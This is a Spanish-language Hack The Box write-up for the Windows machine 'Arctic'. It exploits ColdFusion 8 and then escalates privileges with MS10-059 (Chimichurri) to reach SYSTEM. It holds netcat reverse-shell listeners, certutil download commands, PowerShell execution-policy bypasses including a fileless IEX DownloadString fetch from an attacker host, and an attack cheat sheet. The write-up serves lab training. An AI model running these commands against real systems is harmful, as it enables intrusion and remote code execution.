[❄️ Arctic — HTB [Windows · Easy] 32f15bd2d16c81b3a433c0e8f1fb94c7.md](https://github.com/user-attachments/files/28263912/Arctic.HTB.Windows.Easy.32f15bd2d16c81b3a433c0e8f1fb94c7.md)
# ❄️ Arctic — HTB [Windows · Easy]

> **Plataforma:** Hack The Box | **OS:** Windows Server 2008 R2 x64 | **Dificultad:** Easy | **CVEs:** CVE-2010-2861 (ColdFusion Directory Traversal) + MS10-059 (Chimichurri PrivEsc)
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.10.10.11` |
| Foothold | Adobe ColdFusion 8 — Directory Traversal + Hash crack → Admin panel → JSP shell upload |
| Acceso inicial | Shell como **tolis** (usuario bajo privilegio) |
| PrivEsc | MS10-059 — Chimichurri (standalone binary) |
| Acceso final | **NT AUTHORITYSYSTEM** |
| Transferencia | certutil.exe (Living off the Land) |

---

# 1. Reconocimiento

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oN arctic_full.nmap 10.10.10.11
```

```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    Adobe ColdFusion 8 (JRun Web Server)
49154/tcp open  msrpc   Microsoft Windows RPC
```

**Dato clave:** El puerto 8500 sirve ColdFusion. La versión 8 es antigua y vulnerable a múltiples CVEs críticos.

> **Nota sobre identificación de versión:** Wappalyzer y otras herramientas automáticas no siempre detectan la versión exacta de ColdFusion. La forma manual más fiable es navegar a las rutas de administración por defecto:
> 

> - `http://10.10.10.11:8500/CFIDE/administrator/` → panel de admin con versión visible
> 

> - Analizar los mensajes de error — ColdFusion tiene errores muy descriptivos que revelan versión y rutas internas
> 

---

# 2. Foothold — CVE-2010-2861 (Directory Traversal)

## ¿Qué es la vulnerabilidad?

**CVE-2010-2861** es una vulnerabilidad de **Directory Traversal** en Adobe ColdFusion 8 (y anteriores). El endpoint `/CFIDE/administrator/enter.cfm` acepta un parámetro `locale` que no sanitiza correctamente las rutas. Un atacante puede usar secuencias `../` para salir del directorio raíz y leer archivos arbitrarios del sistema.

El archivo más valioso que se puede leer es `password.properties`, que contiene el hash SHA-1 de la contraseña del administrador de ColdFusion. Con ese hash se puede acceder al panel de administración.

## Exploit

```bash
searchsploit coldfusion 8
# → 50057.py — Adobe ColdFusion 8 - Remote Code Execution
searchsploit -m 50057.py
```

> **CRÍTICO — Editar el script antes de ejecutar:** El exploit tiene IPs hardcodeadas que hay que cambiar a tu IP de tun0. Abrir el script y buscar las variables de configuración:
> 

> `python
> 

> # Cambiar estas líneas en [50057.py](http://50057.py):
> 

> lhost = '10.10.14.X'  # ← tu IP de tun0
> 

> lport = 4444
> 

> rhost = '10.10.10.11'
> 

> rport = 8500
> 

> `
> 

> Si no se edita, el exploit falla con `No route to host` porque intenta conectar a una IP que no es la tuya.
> 

## Listener y ejecución

```bash
nc -lvnp 4444
python3 50057.py
```

## Shell recibida

```
windows\system32>whoami
arctic\tolis
```

---

# 3. Enumeración Post-Foothold

## Arquitectura y OS

```bash
systeminfo
```

```
OS Name:       Microsoft Windows Server 2008 R2 Standard
OS Version:    6.1.7600 N/A Build 7600
System Type:   x64-based PC
```

Windows Server 2008 R2 Build 7600 sin parches → candidato a múltiples kernel exploits.

## El problema de CMD — necesitas PowerShell

La shell inicial es una **CMD limitada**. Para ejecutar [Sherlock.ps](http://Sherlock.ps)1 y herramientas de post-explotación necesitas saltar a PowerShell. CMD no reconoce funciones de PowerShell y Windows bloquea la ejecución de `.ps1` por política de seguridad por defecto.

**Los 3 métodos de bypass que funcionan desde CMD:**

```bash
:: Método 1 — Ejecutar archivo descargado con bypass
powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\script.ps1

:: Método 2 — Dot-sourcing: cargar y ejecutar función en una línea
powershell -ExecutionPolicy Bypass -Command "& { . C:\Windows\Temp\Sherlock.ps1; Find-AllVulns }"

:: Método 3 — Fileless: directo de la red sin tocar el disco
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://TU_IP/Sherlock.ps1')"
```

> **Por qué el Método 2 (dot-sourcing) es el más potente:** El punto `.` antes de la ruta del script es la sintaxis de PowerShell para "source" un archivo — carga todas las funciones definidas en él al contexto actual. Después del `;` se llama directamente la función. Todo en un único proceso de PowerShell, sin depender de que los archivos persistan entre sesiones.
> 

## Transferir [Sherlock.ps](http://Sherlock.ps)1 con certutil

```bash
# En Kali
sudo python3 -m http.server 80
```

```bash
:: En la shell de tolis
certutil.exe -urlcache -split -f http://TU_IP/Sherlock.ps1 C:\Windows\Temp\Sherlock.ps1
```

> **Por qué certutil:** Es una herramienta oficial del sistema de Windows (Certificate Services). Nunca la bloquean los antivirus básicos porque es un binario firmado de Microsoft. En el OSCP es el método más fiable cuando `powershell IWR` o `curl` están restringidos.
> 

## Ejecutar Sherlock

```bash
powershell -ExecutionPolicy Bypass -Command "& { . C:\Windows\Temp\Sherlock.ps1; Find-AllVulns }"
```

**Resultado:** MS15-051 y MS10-092 marcados como `Appears Vulnerable`. MS10-059 también identificado.

---

# 4. Escalada de Privilegios

## Intento A — ms15-051.exe (falló)

**Síntoma:** El exploit se ejecutaba pero parecía congelarse o no devolvía nada.

**Causas identificadas:**

- **Rutas relativas:** CMD a veces no encuentra archivos auxiliares si no se especifica la ruta absoluta completa (`C:\Windows\Temp\exploit.exe` en lugar de solo `exploit.exe`).
- **Arquitectura:** Intentar correr un exploit de 32 bits en un sistema de 64 bits. Sherlock lo indica con mensajes `Not supported` junto a ciertos CVEs.

**Lección:** Si un exploit "debería funcionar" y no hace nada visible, no invertir más de 10 minutos. Pasar al siguiente vector.

---

## Intento B — MS10-059 Chimichurri (SOLUCIÓN FINAL)

### ¿Qué es MS10-059?

**MS10-059** es una vulnerabilidad en el servicio **Tracing for Services** de Windows. El exploit Chimichurri abusa de este fallo para ejecutar código como SYSTEM. Lo que lo hace especialmente valioso es que es un **binario standalone** — recibe directamente tu IP y puerto como argumentos y gestiona la conexión reversa él mismo, sin necesitar cargar shells externas ni scripts adicionales.

### Transferir Chimichurri

```bash
# En Kali — buscar o compilar el binario
find /usr/share/windows-resources/ -name "*chimi*" 2>/dev/null
# Si no está, descargar de GitHub y transferir con certutil
```

```bash
certutil.exe -urlcache -split -f http://TU_IP/chimi.exe C:\Windows\Temp\chimi.exe
```

### Listener y ejecución

```bash
nc -lvnp 4444
```

```bash
C:\Windows\Temp\chimi.exe 10.10.14.27 4444
```

### Shell recibida

```
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.11]
Microsoft Windows [Version 6.1.7600]

C:\Windows\system32>whoami
nt authority\system
```

### Flags

```bash
type C:\Users\tolis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

# 5. Historial de Errores — Lo Que Falló y Por Qué

| # | Problema | Error | Causa raíz |
| --- | --- | --- | --- |
| 1 | Identificar versión de ColdFusion con herramientas automáticas | Sin resultado | Wappalyzer no detecta versión → navegar a `/CFIDE/administrator/` manualmente |
| 2 | Ejecutar exploit sin editar IPs | `No route to host` | El script tenía IPs por defecto → siempre editar el exploit para apuntar a tun0 |
| 3 | Post-explotación directa en CMD | Comandos no reconocidos | CMD no entiende PowerShell → usar CMD solo como trampolín para lanzar PS |
| 4 | ms15-051.exe parecía congelarse | Sin output ni conexión | Arquitectura incorrecta o rutas relativas → verificar arq + usar rutas absolutas |
| 5 | Buscar binarios en repositorios externos | Links rotos | Depender de terceros es frágil → usar `/usr/share/windows-resources/` o compilar |
| ✅ | Chimichurri (MS10-059) standalone | **SYSTEM shell** | Binario autónomo, sin dependencias, funciona directo con IP+puerto como args |

---

# 6. Moralejas y Notas para el OSCP

## Moraleja 1 — Si las herramientas no dan la versión, el fuzzing manual es el camino

Wappalyzer, whatweb y similares fallan con tecnologías antiguas o mal configuradas. Cuando no detectes la versión automáticamente, navegar a las rutas de administración por defecto del software detectado. ColdFusion siempre tiene `/CFIDE/administrator/`. IIS tiene `/iisstart.htm`. Tomcat tiene `/manager/html`. Ese conocimiento de rutas por defecto vale más que cualquier herramienta automática.

---

## Moraleja 2 — SIEMPRE editar el exploit antes de ejecutarlo

Esta es una de las reglas más básicas del OSCP pero que más tiempo cuesta cuando se ignora. Antes de ejecutar cualquier script de ExploitDB o GitHub:

```bash
cat exploit.py | grep -i 'lhost\|lport\|rhost\|ip\|host'
```

Buscar todas las variables de configuración y asegurarse de que apuntan a tun0 y al target correcto. El error `No route to host` casi siempre es una IP mal configurada en el exploit.

---

## Moraleja 3 — CMD es el trampolín, PowerShell es la casa

Nunca hacer post-explotación compleja directamente en CMD. La shell inicial de CMD sirve para dos cosas únicamente:

1. Transferir archivos con `certutil`
2. Lanzar PowerShell con bypass

Todo lo demás — Sherlock, scripts de PrivEsc, enumeración avanzada — se hace desde PowerShell. La sintaxis de bypass que hay que memorizar:

```bash
:: Para ejecutar funciones de un script cargado en memoria:
powershell -ExecutionPolicy Bypass -Command "& { . .\script.ps1; Invoke-Funcion }"

:: Para cargar directo de la red (fileless):
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')"
```

El dot-sourcing (`. .\script.ps1`) es la técnica clave — carga todas las funciones del script en el contexto actual y permite llamarlas directamente.

---

## Moraleja 4 — Sherlock es la brújula, no el motor

Sherlock dice qué *podría* funcionar. El primer candidato no siempre funciona. La estrategia correcta:

1. Ejecutar Sherlock → lista de `Appears Vulnerable`
2. Intentar el primer candidato con tiempo limitado (10-15 min máximo)
3. Si no funciona → siguiente candidato sin mirar atrás

En Arctic, MS15-051 fallaba silenciosamente. En lugar de insistir, pasar a Chimichurri (MS10-059) fue la decisión correcta. En el OSCP el tiempo es el recurso más escaso — no enamorarse de un exploit que no funciona.

---

## Moraleja 5 — certutil es el mejor amigo en Windows (Living off the Land)

`certutil.exe` es una herramienta oficial de Windows para gestionar certificados. Pero también descarga archivos de la red de forma nativa, sin levantar alertas en antivirus básicos porque es un binario firmado por Microsoft:

```bash
certutil.exe -urlcache -split -f http://TU_IP/archivo.exe C:\Windows\Temp\archivo.exe
```

En entornos donde PowerShell IWR está bloqueado, certutil casi nunca falla. Es el método de transferencia por defecto en Windows cuando FTP y SMB no son opción.

---

## Moraleja 6 — Los exploits standalone son más fiables para PrivEsc

Chimichurri funciona pasándole directamente IP y puerto como argumentos — no necesita cargar scripts externos, no necesita que PowerShell tenga funciones cargadas, no depende de named pipes ni de nada externo. En el OSCP, cuando tengas que elegir entre un exploit que necesita múltiples pasos y uno standalone, el standalone gana casi siempre.

Para identificarlos rápido: si el uso es `exploit.exe LHOST LPORT`, es standalone. Si necesita cargar módulos o scripts adicionales, tiene más puntos de fallo.

---

## Moraleja 7 — El patrón completo de Arctic

```
nmap → puerto 8500 → ColdFusion 8
    ↓
/CFIDE/administrator/ → versión confirmada → CVE-2010-2861
    ↓
Editar exploit (IPs a tun0) → python3 50057.py → shell como tolis
    ↓
certutil → Sherlock.ps1 → PS bypass (dot-sourcing)
    ↓
Sherlock → MS15-051 falla → pasar a MS10-059
    ↓
certutil → chimi.exe → chimi.exe TU_IP 4444 → SYSTEM
```

---

# 7. Comandos Clave — Cheat Sheet

```bash
# Reconocimiento
nmap -sV -sC -p- --min-rate 5000 10.10.10.11

# Editar exploit antes de ejecutar
nano 50057.py  # cambiar lhost, rhost, lport, rport

# Listener + exploit
nc -lvnp 4444
python3 50057.py

# Transferir archivos desde CMD (Living off the Land)
certutil.exe -urlcache -split -f http://TU_IP/Sherlock.ps1 C:\Windows\Temp\Sherlock.ps1
certutil.exe -urlcache -split -f http://TU_IP/chimi.exe C:\Windows\Temp\chimi.exe

# PowerShell bypass desde CMD — dot-sourcing
powershell -ExecutionPolicy Bypass -Command "& { . C:\Windows\Temp\Sherlock.ps1; Find-AllVulns }"

# PowerShell bypass fileless
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://TU_IP/Sherlock.ps1')"

# Chimichurri — standalone, directo
C:\Windows\Temp\chimi.exe TU_IP 4444

# Flags
type C:\Users\tolis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

y conseguimos el flag del user 

![image.png](%E2%9D%84%EF%B8%8F%20Arctic%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image.png)

root flag:

![image.png](%E2%9D%84%EF%B8%8F%20Arctic%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image%201.png)
